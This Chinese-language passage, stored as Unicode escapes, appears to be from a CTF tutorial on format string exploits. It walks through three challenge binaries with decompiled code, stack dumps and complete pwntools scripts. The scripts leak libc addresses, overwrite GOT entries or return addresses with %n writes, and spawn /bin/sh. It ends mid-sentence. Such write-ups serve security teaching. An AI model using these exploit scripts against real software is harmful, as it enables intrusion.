\u8fd9\u4e00\u6b65\u6211\u4eec\u5229\u7528\u7684\u51fd\u6570A\u4e00\u822c\u5728\u7a0b\u5e8f\u4e2d\u5df2\u6709\uff0c\u6240\u4ee5\u53ef\u4ee5\u91c7\u7528\u7b80\u5355\u7684\u5bfb\u627e\u5730\u5740\u7684\u65b9\u6cd5\u6765\u627e\u3002 \u786e\u5b9a\u51fd\u6570B\u7684\u5185\u5b58\u5730\u5740 \u8fd9\u4e00\u6b65\u901a\u5e38\u6765\u8bf4\uff0c\u9700\u8981\u6211\u4eec\u81ea\u5df1\u60f3\u529e\u6cd5\u6765\u6cc4\u9732\u5bf9\u5e94\u51fd\u6570B\u7684\u5730\u5740\u3002 \u5c06\u51fd\u6570B\u7684\u5185\u5b58\u5730\u5740\u5199\u5165\u5230\u51fd\u6570A\u7684GOT\u8868\u5730\u5740\u5904\u3002 \u8fd9\u4e00\u6b65\u4e00\u822c\u6765\u8bf4\u9700\u8981\u6211\u4eec\u5229\u7528\u51fd\u6570\u7684\u6f0f\u6d1e\u6765\u8fdb\u884c\u89e6\u53d1\u3002\u4e00\u822c\u5229\u7528\u65b9\u6cd5\u6709\u5982\u4e0b\u4e24\u79cd \u5199\u5165\u51fd\u6570\uff1awrite\u51fd\u6570\u3002 ROP pop eax; ret; # printf@got -> eax pop ebx; ret; # (addr_offset = system_addr - printf_addr) -> ebx add [eax] ebx; ret; # [printf@got] = [printf@got] + addr_offset \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4efb\u610f\u5730\u5740\u5199 \u4f8b\u5b50 \u00b6 \u8fd9\u91cc\u6211\u4eec\u4ee52016 CCTF\u4e2d\u7684pwn3\u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002 \u786e\u5b9a\u4fdd\u62a4 \u00b6 \u5982\u4e0b \u279c 2016 -CCTF-pwn3 git: ( master ) \u2717 checksec pwn3 Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE ( 0x8048000 ) \u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u4e3b\u8981\u5f00\u542f\u4e86NX\u4fdd\u62a4\u3002\u6211\u4eec\u4e00\u822c\u9ed8\u8ba4\u8fdc\u7a0b\u90fd\u662f\u5f00\u542fASLR\u4fdd\u62a4\u7684\u3002 \u5206\u6790\u7a0b\u5e8f \u00b6 \u9996\u5148\u5206\u6790\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u53d1\u73b0\u7a0b\u5e8f\u4f3c\u4e4e\u4e3b\u8981\u5b9e\u73b0\u4e86\u4e00\u4e2a\u9700\u5bc6\u7801\u767b\u5f55\u7684ftp\uff0c\u5177\u6709get\uff0cput\uff0cdir\u4e09\u4e2a\u57fa\u672c\u529f\u80fd\u3002\u5927\u6982\u6d4f\u89c8\u4e00\u4e0b\u6bcf\u4e2a\u529f\u80fd\u7684\u4ee3\u7801\uff0c\u53d1\u73b0\u5728get\u529f\u80fd\u4e2d\u5b58\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e int get_file () { char dest ; // [sp+1Ch] [bp-FCh]@5 char s1 ; // [sp+E4h] [bp-34h]@1 char * i ; // [sp+10Ch] [bp-Ch]@3 printf ( \"enter the file name you want to get:\" ); __isoc99_scanf ( \"%40s\" , & s1 ); if ( ! strncmp ( & s1 , \"flag\" , 4u ) ) puts ( \"too young, too simple\" ); for ( i = ( char * ) file_head ; i ; i = ( char * ) * (( _DWORD * ) i + 60 ) ) { if ( ! strcmp ( i , & s1 ) ) { strcpy ( & dest , i + 0x28 ); return printf ( & dest ); } } return printf ( & dest ); } \u6f0f\u6d1e\u5229\u7528\u601d\u8def \u00b6 \u65e2\u7136\u6709\u4e86\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u786e\u5b9a\u5982\u4e0b\u7684\u5229\u7528\u601d\u8def \u7ed5\u8fc7\u5bc6\u7801 \u786e\u5b9a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u53c2\u6570\u504f\u79fb \u5229\u7528put@got\u83b7\u53d6put\u51fd\u6570\u5730\u5740\uff0c\u8fdb\u800c\u83b7\u53d6\u5bf9\u5e94\u7684libc.so\u7684\u7248\u672c\uff0c\u8fdb\u800c\u83b7\u53d6\u5bf9\u5e94system\u51fd\u6570\u5730\u5740\u3002 \u4fee\u6539puts@got\u7684\u5185\u5bb9\u4e3asystem\u7684\u5730\u5740\u3002 \u5f53\u7a0b\u5e8f\u518d\u6b21\u6267\u884cputs\u51fd\u6570\u7684\u65f6\u5019\uff0c\u5176\u5b9e\u6267\u884c\u7684\u662fsystem\u51fd\u6570\u3002 \u6f0f\u6d1e\u5229\u7528\u7a0b\u5e8f \u00b6 \u5982\u4e0b from pwn import * from LibcSearcher import LibcSearcher ##context.log_level = 'debug' pwn3 = ELF ( './pwn3' ) if args [ 'REMOTE' ]: sh = remote ( '111' , 111 ) else : sh = process ( './pwn3' ) def get ( name ): sh . sendline ( 'get' ) sh . recvuntil ( 'enter the file name you want to get:' ) sh . sendline ( name ) data = sh . recv () return data def put ( name , content ): sh . sendline ( 'put' ) sh . recvuntil ( 'please enter the name of the file you want to upload:' ) sh . sendline ( name ) sh . recvuntil ( 'then, enter the content:' ) sh . sendline ( content ) def show_dir (): sh . sendline ( 'dir' ) tmp = 'sysbdmin' name = \"\" for i in tmp : name += chr ( ord ( i ) - 1 ) ## password def password (): sh . recvuntil ( 'Name (ftp.hacker.server:Rainism):' ) sh . sendline ( name ) ##password password () ## get the addr of puts puts_got = pwn3 . got [ 'puts' ] log . success ( 'puts got : ' + hex ( puts_got )) put ( '1111' , '%8$s' + p32 ( puts_got )) puts_addr = u32 ( get ( '1111' )[: 4 ]) ## get addr of system libc = LibcSearcher ( \"puts\" , puts_addr ) system_offset = libc . dump ( 'system' ) puts_offset = libc . dump ( 'puts' ) system_addr = puts_addr - puts_offset + system_offset log . success ( 'system addr : ' + hex ( system_addr )) ## modify puts@got, point to system_addr payload = fmtstr_payload ( 7 , { puts_got : system_addr }) put ( '/bin/sh;' , payload ) sh . recvuntil ( 'ftp>' ) sh . sendline ( 'get' ) sh . recvuntil ( 'enter the file name you want to get:' ) ##gdb.attach(sh) sh . sendline ( '/bin/sh;' ) ## system('/bin/sh') show_dir () sh . interactive () \u6ce8\u610f \u6211\u5728\u83b7\u53d6puts\u51fd\u6570\u5730\u5740\u65f6\u4f7f\u7528\u7684\u504f\u79fb\u662f8\uff0c\u8fd9\u662f\u56e0\u4e3a\u6211\u5e0c\u671b\u6211\u8f93\u51fa\u7684\u524d4\u4e2a\u5b57\u8282\u5c31\u662fputs\u51fd\u6570\u7684\u5730\u5740\u3002\u5176\u5b9e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u9996\u5730\u5740\u7684\u504f\u79fb\u662f7\u3002 \u8fd9\u91cc\u6211\u5229\u7528\u4e86pwntools\u4e2d\u7684fmtstr_payload\u51fd\u6570\uff0c\u6bd4\u8f83\u65b9\u4fbf\u83b7\u53d6\u6211\u4eec\u5e0c\u671b\u5f97\u5230\u7684\u7ed3\u679c\uff0c\u6709\u5174\u8da3\u7684\u53ef\u4ee5\u67e5\u770b\u5b98\u65b9\u6587\u6863\u5c1d\u8bd5\u3002\u6bd4\u5982\u8fd9\u91ccfmtstr_payload(7, {puts_got: system_addr})\u7684\u610f\u601d\u5c31\u662f\uff0c\u6211\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u662f7\uff0c\u6211\u5e0c\u671b\u5728puts_got\u5730\u5740\u5904\u5199\u5165system_addr\u5730\u5740\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u662f\u6309\u7167\u5b57\u8282\u6765\u5199\u7684\u3002 hijack retaddr \u00b6 \u539f\u7406 \u00b6 \u5f88\u5bb9\u6613\u7406\u89e3\uff0c\u6211\u4eec\u8981\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u6765\u52ab\u6301\u7a0b\u5e8f\u7684\u8fd4\u56de\u5730\u5740\u5230\u6211\u4eec\u60f3\u8981\u6267\u884c\u7684\u5730\u5740\u3002 \u4f8b\u5b50 \u00b6 \u8fd9\u91cc\u6211\u4eec\u4ee5\u4e09\u4e2a\u767d\u5e3d-pwnme_k0\u4e3a\u4f8b\u8fdb\u884c\u5206\u6790\u3002 \u786e\u5b9a\u4fdd\u62a4 \u00b6 \u279c \u4e09\u4e2a\u767d\u5e3d-pwnme_k0 git: ( master ) \u2717 checksec pwnme_k0 Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE ( 0x400000 ) \u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u4e3b\u8981\u5f00\u542f\u4e86NX\u4fdd\u62a4\u4ee5\u53caFull RELRO\u4fdd\u62a4\u3002\u8fd9\u6211\u4eec\u5c31\u6ca1\u6709\u529e\u6cd5\u4fee\u6539\u7a0b\u5e8f\u7684got\u8868\u4e86\u3002 \u5206\u6790\u7a0b\u5e8f \u00b6 \u7b80\u5355\u5206\u6790\u4e00\u4e0b\uff0c\u5c31\u77e5\u9053\u7a0b\u5e8f\u4f3c\u4e4e\u4e3b\u8981\u5b9e\u73b0\u4e86\u4e00\u4e2a\u7c7b\u4f3c\u8d26\u6237\u6ce8\u518c\u4e4b\u7c7b\u7684\u529f\u80fd\uff0c\u4e3b\u8981\u6709\u4fee\u6539\u67e5\u770b\u529f\u80fd\uff0c\u7136\u540e\u53d1\u73b0\u5728\u67e5\u770b\u529f\u80fd\u4e2d\u53d1\u73b0\u4e86\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e int __usercall sub_400B07 @ < eax > ( char format @ < dil > , char formata , __int64 a3 , char a4 ) { write ( 0 , \"Welc0me to sangebaimao! \\n \" , 0x1AuLL ); printf ( & formata , \"Welc0me to sangebaimao! \\n \" ); return printf ( & a4 + 4 ); } \u5176\u8f93\u51fa\u7684\u5185\u5bb9\u4e3a&a4+4\u3002\u6211\u4eec\u56de\u6eaf\u4e00\u4e0b\uff0c\u53d1\u73b0\u6211\u4eec\u8bfb\u5165\u7684passwrod\u5185\u5bb9\u4e5f\u662f v6 = read ( 0 , ( char * ) & a4 + 4 , 0x14uLL ); \u5f53\u7136\u6211\u4eec\u8fd8\u53ef\u4ee5\u53d1\u73b0\u6211\u4eec\u8bfb\u5165\u7684username\u5728\u8ddd\u79bb\u7684password20\u4e2a\u5b57\u8282\u3002 puts ( \"Input your username(max lenth:20): \" ); fflush ( stdout ); v8 = read ( 0 , & bufa , 0x14uLL ); if ( v8 && v8 <= 0x14u ) { puts ( \"Input your password(max lenth:20): \" ); fflush ( stdout ); v6 = read ( 0 , ( char * ) & a4 + 4 , 0x14uLL ); fflush ( stdout ); * ( _QWORD * ) buf = bufa ; * ( _QWORD * )( buf + 8 ) = a3 ; * ( _QWORD * )( buf + 16 ) = a4 ; \u597d\uff0c\u8fd9\u5c31\u5dee\u4e0d\u591a\u4e86\u3002\u6b64\u5916\uff0c\u4e5f\u53ef\u4ee5\u53d1\u73b0\u8fd9\u4e2a\u8d26\u53f7\u5bc6\u7801\u5176\u5b9e\u6ca1\u5565\u914d\u5bf9\u4e0d\u914d\u5bf9\u7684\u3002 \u5229\u7528\u601d\u8def \u00b6 \u6211\u4eec\u6700\u7ec8\u7684\u76ee\u7684\u662f\u5e0c\u671b\u53ef\u4ee5\u83b7\u5f97\u7cfb\u7edf\u7684 shell\uff0c\u53ef\u4ee5\u53d1\u73b0\u5728\u7ed9\u5b9a\u7684\u6587\u4ef6\u4e2d\uff0c\u5728 0x00000000004008A6 \u5730\u5740\u5904\u6709\u4e00\u4e2a\u76f4\u63a5\u8c03\u7528system('bin/sh') \u7684\u51fd\u6570\uff08\u5173\u4e8e\u8fd9\u4e2a\u7684\u53d1\u73b0\uff0c\u4e00\u822c\u90fd\u4f1a\u73b0\u5728\u7a0b\u5e8f\u5927\u81f4\u770b\u4e00\u4e0b\u3002\uff09\u3002\u90a3\u5982\u679c\u6211\u4eec\u4fee\u6539\u67d0\u4e2a\u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\u4e3a\u8fd9\u4e2a\u5730\u5740\uff0c\u90a3\u5c31\u76f8\u5f53\u4e8e\u83b7\u5f97\u4e86 shell\u3002 \u867d\u7136\u5b58\u50a8\u8fd4\u56de\u5730\u5740\u7684\u5185\u5b58\u672c\u8eab\u662f\u52a8\u6001\u53d8\u5316\u7684\uff0c\u4f46\u662f\u5176\u76f8\u5bf9\u4e8e rbp \u7684\u5730\u5740\u5e76\u4e0d\u4f1a\u6539\u53d8\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u76f8\u5bf9\u5730\u5740\u6765\u8ba1\u7b97\u3002\u5229\u7528\u601d\u8def\u5982\u4e0b \u786e\u5b9a\u504f\u79fb \u83b7\u53d6\u51fd\u6570\u7684 rbp \u4e0e\u8fd4\u56de\u5730\u5740 \u6839\u636e\u76f8\u5bf9\u504f\u79fb\u83b7\u53d6\u5b58\u50a8\u8fd4\u56de\u5730\u5740\u7684\u5730\u5740 \u5c06\u6267\u884c system \u51fd\u6570\u8c03\u7528\u7684\u5730\u5740\u5199\u5165\u5230\u5b58\u50a8\u8fd4\u56de\u5730\u5740\u7684\u5730\u5740\u3002 \u786e\u5b9a\u504f\u79fb \u00b6 \u9996\u5148\uff0c\u6211\u4eec\u5148\u6765\u786e\u5b9a\u4e00\u4e0b\u504f\u79fb\u3002\u8f93\u5165\u7528\u6237\u540d aaaaaaaa\uff0c\u5bc6\u7801\u968f\u4fbf\u8f93\u5165\uff0c\u65ad\u70b9\u4e0b\u5728\u8f93\u51fa\u5bc6\u7801\u7684\u90a3\u4e2a printf(&a4 + 4) \u51fd\u6570\u5904 Register Account first! Input your username(max lenth:20): aaaaaaaa Input your password(max lenth:20): %p%p%p%p%p%p%p%p%p%p Register Success!! 1.Sh0w Account Infomation! 2.Ed1t Account Inf0mation! 3.QUit sangebaimao:( >error options 1.Sh0w Account Infomation! 2.Ed1t Account Inf0mation! 3.QUit sangebaimao:( >1 ... \u6b64\u65f6\u6808\u7684\u60c5\u51b5\u4e3a \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ code:i386:x86-64 ]\u2500\u2500\u2500\u2500 0x400b1a call 0x400758 0x400b1f lea rdi, [rbp+0x10] 0x400b23 mov eax, 0x0 \u2192 0x400b28 call 0x400770 \u21b3 0x400770 jmp QWORD PTR [rip+0x20184a] # 0x601fc0 0x400776 xchg ax, ax 0x400778 jmp QWORD PTR [rip+0x20184a] # 0x601fc8 0x40077e xchg ax, ax \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ stack ]\u2500\u2500\u2500\u2500 0x00007fffffffdb40\u2502+0x00: 0x00007fffffffdb80 \u2192 0x00007fffffffdc30 \u2192 0x0000000000400eb0 \u2192 push r15 \u2190 $rsp, $rbp 0x00007fffffffdb48\u2502+0x08: 0x0000000000400d74 \u2192 add rsp, 0x30 0x00007fffffffdb50\u2502+0x10: \"aaaaaaaa\" \u2190 $rdi 0x00007fffffffdb58\u2502+0x18: 0x000000000000000a 0x00007fffffffdb60\u2502+0x20: 0x7025702500000000 0x00007fffffffdb68\u2502+0x28: \"%p%p%p%p%p%p%p%pM\\r@\" 0x00007fffffffdb70\u2502+0x30: \"%p%p%p%pM\\r@\" 0x00007fffffffdb78\u2502+0x38: 0x0000000000400d4d \u2192 cmp eax, 0x2 \u53ef\u4ee5\u53d1\u73b0\u6211\u4eec\u8f93\u5165\u7684\u7528\u6237\u540d\u5728\u6808\u4e0a\u7b2c\u4e09\u4e2a\u4f4d\u7f6e\uff0c\u90a3\u4e48\u9664\u53bb\u672c\u8eab\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u4f4d\u7f6e\uff0c\u5176\u504f\u79fb\u4e3a\u4e3a 5 + 3 = 8\u3002 \u4fee\u6539\u5730\u5740 \u00b6 \u6211\u4eec\u518d\u4ed4\u7ec6\u89c2\u5bdf\u4e0b\u65ad\u70b9\u5904\u6808\u7684\u4fe1\u606f 0x00007fffffffdb40\u2502+0x00: 0x00007fffffffdb80 \u2192 0x00007fffffffdc30 \u2192 0x0000000000400eb0 \u2192 push r15 \u2190 $rsp, $rbp 0x00007fffffffdb48\u2502+0x08: 0x0000000000400d74 \u2192 add rsp, 0x30 0x00007fffffffdb50\u2502+0x10: \"aaaaaaaa\" \u2190 $rdi 0x00007fffffffdb58\u2502+0x18: 0x000000000000000a 0x00007fffffffdb60\u2502+0x20: 0x7025702500000000 0x00007fffffffdb68\u2502+0x28: \"%p%p%p%p%p%p%p%pM\\r@\" 0x00007fffffffdb70\u2502+0x30: \"%p%p%p%pM\\r@\" 0x00007fffffffdb78\u2502+0x38: 0x0000000000400d4d \u2192 cmp eax, 0x2 \u53ef\u4ee5\u770b\u5230\u6808\u4e0a\u7b2c\u4e8c\u4e2a\u4f4d\u7f6e\u5b58\u50a8\u7684\u5c31\u662f\u8be5\u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740(\u5176\u5b9e\u4e5f\u5c31\u662f\u8c03\u7528 show account \u51fd\u6570\u65f6\u6267\u884c push rip \u6240\u5b58\u50a8\u7684\u503c)\uff0c\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4e2d\u7684\u504f\u79fb\u4e3a 7\u3002 \u4e0e\u6b64\u540c\u65f6\u6808\u4e0a\uff0c\u7b2c\u4e00\u4e2a\u5143\u7d20\u5b58\u50a8\u7684\u4e5f\u5c31\u662f\u4e0a\u4e00\u4e2a\u51fd\u6570\u7684 rbp\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u504f\u79fb 0x00007fffffffdb80 - 0x00007fffffffdb48 = 0x38\u3002\u7ee7\u800c\u5982\u679c\u6211\u4eec\u77e5\u9053\u4e86 rbp \u7684\u6570\u503c\uff0c\u5c31\u77e5\u9053\u4e86\u51fd\u6570\u8fd4\u56de\u5730\u5740\u7684\u5730\u5740\u3002 0x0000000000400d74 \u4e0e 0x00000000004008A6 \u53ea\u6709\u4f4e 2 \u5b57\u8282\u4e0d\u540c\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u53ea\u4fee\u6539 0x00007fffffffdb48 \u5f00\u59cb\u7684 2 \u4e2a\u5b57\u8282\u3002 \u8fd9\u91cc\u9700\u8981\u8bf4\u660e\u7684\u662f\u5728\u67d0\u4e9b\u8f83\u65b0\u7684\u7cfb\u7edf(\u5982 ubuntu 18.04)\u4e0a, \u76f4\u63a5\u4fee\u6539\u8fd4\u56de\u5730\u5740\u4e3a 0x00000000004008A6 \u65f6\u53ef\u80fd\u4f1a\u53d1\u751f\u7a0b\u5e8f crash, \u8fd9\u65f6\u53ef\u4ee5\u8003\u8651\u4fee\u6539\u8fd4\u56de\u5730\u5740\u4e3a 0x00000000004008AA, \u5373\u76f4\u63a5\u8c03\u7528 system(\"/bin/sh\") \u5904 .text:00000000004008A6 sub_4008A6 proc near .text:00000000004008A6 ; __unwind { .text:00000000004008A6 push rbp .text:00000000004008A7 mov rbp, rsp .text:00000000004008AA <- here mov edi, offset command ; \"/bin/sh\" .text:00000000004008AF call system .text:00000000004008B4 pop rdi .text:00000000004008B5 pop rsi .text:00000000004008B6 pop rdx .text:00000000004008B7 retn \u5229\u7528\u7a0b\u5e8f \u00b6 from pwn import * context . log_level = \"debug\" context . arch = \"amd64\" sh = process ( \"./pwnme_k0\" ) binary = ELF ( \"pwnme_k0\" ) #gdb.attach(sh) sh . recv () sh . writeline ( \"1\" * 8 ) sh . recv () sh . writeline ( \"%6$p\" ) sh . recv () sh . writeline ( \"1\" ) sh . recvuntil ( \"0x\" ) ret_addr = int ( sh . recvline () . strip (), 16 ) - 0x38 success ( \"ret_addr:\" + hex ( ret_addr )) sh . recv () sh . writeline ( \"2\" ) sh . recv () sh . sendline ( p64 ( ret_addr )) sh . recv () #sh.writeline(\"%2214d%8$hn\") #0x4008aa-0x4008a6 sh . writeline ( \" %2218d %8$hn\" ) sh . recv () sh . writeline ( \"1\" ) sh . recv () sh . interactive () \u5806\u4e0a\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e \u00b6 \u539f\u7406 \u00b6 \u6240\u8c13\u5806\u4e0a\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6307\u7684\u662f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u672c\u8eab\u5b58\u50a8\u5728\u5806\u4e0a\uff0c\u8fd9\u4e2a\u4e3b\u8981\u589e\u52a0\u4e86\u6211\u4eec\u83b7\u53d6\u5bf9\u5e94\u504f\u79fb\u7684\u96be\u5ea6\uff0c\u800c\u4e00\u822c\u6765\u8bf4\uff0c\u8be5\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u90fd\u662f\u5f88\u6709\u53ef\u80fd\u88ab\u590d\u5236\u5230\u6808\u4e0a\u7684\u3002 \u4f8b\u5b50 \u00b6 \u8fd9\u91cc\u6211\u4eec\u4ee52015\u5e74CSAW\u4e2d\u7684contacts\u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002 \u786e\u5b9a\u4fdd\u62a4 \u00b6 \u279c 2015 -CSAW-contacts git: ( master ) \u2717 checksec contacts Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE ( 0x8048000 ) \u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u4e0d\u4ec5\u5f00\u542f\u4e86NX\u4fdd\u62a4\u8fd8\u5f00\u542f\u4e86Canary\u3002 \u5206\u6790\u7a0b\u5e8f \u00b6 \u7b80\u5355\u770b\u770b\u7a0b\u5e8f\uff0c\u53d1\u73b0\u7a0b\u5e8f\u6b63\u5982\u540d\u5b57\u6240\u63cf\u8ff0\u7684\uff0c\u662f\u4e00\u4e2a\u8054\u7cfb\u4eba\u76f8\u5173\u7684\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u5b9e\u73b0\u521b\u5efa\uff0c\u4fee\u6539\uff0c\u5220\u9664\uff0c\u6253\u5370\u8054\u7cfb\u4eba\u7684\u4fe1\u606f\u3002\u800c\u518d\u4ed4\u7ec6\u9605\u8bfb\uff0c\u53ef\u4ee5\u53d1\u73b0\u5728\u8f93\u5165\u8054\u7cfb\u4eba\u4fe1\u606f\u7684\u65f6\u5019\u5b58\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u3002 int __cdecl PrintInfo ( int a1 , int a2 , int a3 , char * format ) { printf ( \" \\t Name: %s \\n \" , a1 ); printf ( \" \\t Length %u \\n \" , a2 ); printf ( \" \\t Phone #: %s \\n \" , a3 ); printf ( \" \\t Description: \" ); return printf ( format ); } \u4ed4\u7ec6\u770b\u770b\uff0c\u53ef\u4ee5\u53d1\u73b0\u8fd9\u4e2aformat\u5176\u5b9e\u662f\u6307\u5411\u5806\u4e2d\u7684\u3002 \u5229\u7528\u601d\u8def \u00b6 \u6211\u4eec\u7684\u57fa\u672c\u76ee\u7684\u662f\u83b7\u53d6\u7cfb\u7edf\u7684shell\uff0c\u4ece\u800c\u62ff\u5230flag\u3002\u5176\u5b9e\u65e2\u7136\u6709\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u6211\u4eec\u5e94\u8be5\u662f\u53ef\u4ee5\u901a\u8fc7\u52ab\u6301got\u8868\u6216\u8005\u63a7\u5236\u7a0b\u5e8f\u8fd4\u56de\u5730\u5740\u6765\u63a7\u5236\u7a0b\u5e8f\u6d41\u7a0b\u3002\u4f46\u662f\u8fd9\u91cc\u5374\u4e0d\u600e\u4e48\u53ef\u884c\u3002\u539f\u56e0\u5206\u522b\u5982\u4e0b \u4e4b\u6240\u4ee5\u4e0d\u80fd\u591f\u52ab\u6301got\u6765\u63a7\u5236\u7a0b\u5e8f\u6d41\u7a0b\uff0c\u662f\u56e0\u4e3a\u6211\u4eec\u53d1\u73b0\u5bf9\u4e8e\u7a0b\u5e8f\u4e2d\u5e38\u89c1\u7684\u53ef\u4ee5\u5bf9\u4e8e\u6211\u4eec\u7ed9\u5b9a\u7684\u5b57\u7b26\u4e32\u8f93\u51fa\u7684\u53ea\u6709printf\u51fd\u6570\uff0c\u6211\u4eec\u53ea\u6709\u9009\u62e9\u5b83\u624d\u53ef\u4ee5\u6784\u9020/bin/sh\u8ba9\u5b83\u6267\u884csystem('/bin/sh')\uff0c\u4f46\u662fprintf\u51fd\u6570\u5728\u5176\u4ed6\u5730\u65b9\u4e5f\u5747\u6709\u7528\u5230\uff0c\u8fd9\u6837\u505a\u4f1a\u4f7f\u5f97\u7a0b\u5e8f\u76f4\u63a5\u5d29\u6e83\u3002 \u5176\u6b21\uff0c\u4e0d\u80fd\u591f\u76f4\u63a5\u63a7\u5236\u7a0b\u5e8f\u8fd4\u56de\u5730\u5740\u6765\u63a7\u5236\u7a0b\u5e8f\u6d41\u7a0b\u7684\u662f\u56e0\u4e3a\u6211\u4eec\u5e76\u6ca1\u6709\u4e00\u5757\u53ef\u4ee5\u76f4\u63a5\u6267\u884c\u7684\u5730\u5740\u6765\u5b58\u50a8\u6211\u4eec\u7684\u5185\u5bb9\uff0c\u540c\u65f6\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6765\u5f80\u6808\u4e0a\u76f4\u63a5\u5199\u5165system_addr+'bbbb'+addr of '/bin/sh\u2018\u4f3c\u4e4e\u5e76\u4e0d\u73b0\u5b9e\u3002 \u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u600e\u4e48\u505a\u5462\uff1f\u6211\u4eec\u8fd8\u6709\u4e4b\u524d\u5728\u6808\u6ea2\u51fa\u8bb2\u7684\u6280\u5de7\uff0cstack pivoting\u3002\u800c\u8fd9\u91cc\uff0c\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u7684\u6070\u597d\u662f\u5806\u5185\u5b58\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u628a\u6808\u8fc1\u79fb\u5230\u5806\u4e0a\u53bb\u3002\u8fd9\u91cc\u6211\u4eec\u901a\u8fc7leave\u6307\u4ee4\u6765\u8fdb\u884c\u6808\u8fc1\u79fb\uff0c\u6240\u4ee5\u5728\u8fc1\u79fb\u4e4b\u524d\u6211\u4eec\u9700\u8981\u4fee\u6539\u7a0b\u5e8f\u4fdd\u5b58ebp\u7684\u503c\u4e3a\u6211\u4eec\u60f3\u8981\u7684\u503c\u3002 \u53ea\u6709\u8fd9\u6837\u5728\u6267\u884cleave\u6307\u4ee4\u7684\u65f6\u5019\uff0cesp\u624d\u4f1a\u6210\u4e3a\u6211\u4eec\u60f3\u8981\u7684\u503c\u3002\u540c\u65f6\uff0c\u56e0\u4e3a\u6211\u4eec\u662f\u4f7f\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6765\u8fdb\u884c\u4fee\u6539\uff0c\u6240\u4ee5\u6211\u4eec\u5f97\u77e5\u9053\u4fdd\u5b58ebp\u7684\u5730\u5740\u4e3a\u591a\u5c11\uff0c\u800c\u8fd9\u65f6PrintInfo\u51fd\u6570\u4e2d\u5b58\u50a8ebp\u7684\u5730\u5740\u6bcf\u6b21\u90fd\u5728\u53d8\u5316\uff0c\u800c\u6211\u4eec\u4e5f\u65e0\u6cd5\u901a\u8fc7\u5176\u4ed6\u65b9\u6cd5\u5f97\u77e5\u3002\u4f46\u662f\uff0c \u7a0b\u5e8f\u4e2d\u538b\u5165\u6808\u4e2d\u7684ebp\u503c\u5176\u5b9e\u4fdd\u5b58\u7684\u662f\u4e0a\u4e00\u4e2a\u51fd\u6570\u7684\u4fdd\u5b58ebp\u503c\u7684\u5730\u5740 \uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4fee\u6539\u5176 \u4e0a\u5c42\u51fd\u6570\u7684\u4fdd\u5b58\u7684ebp\u7684\u503c\uff0c\u5373\u4e0a\u4e0a\u5c42\u51fd\u6570\uff08\u5373main\u51fd\u6570\uff09\u7684ebp\u6570\u503c \u3002\u8fd9\u6837\u5f53\u4e0a\u5c42\u7a0b\u5e8f\u8fd4\u56de\u65f6\uff0c\u5373\u5b9e\u73b0\u4e86\u5c06\u6808\u8fc1\u79fb\u5230\u5806\u7684\u64cd\u4f5c\u3002 \u57fa\u672c\u601d\u8def\u5982\u4e0b \u9996\u5148\u83b7\u53d6system\u51fd\u6570\u7684\u5730\u5740 \u901a\u8fc7\u6cc4\u9732\u67d0\u4e2alibc\u51fd\u6570\u7684\u5730\u5740\u6839\u636elibc 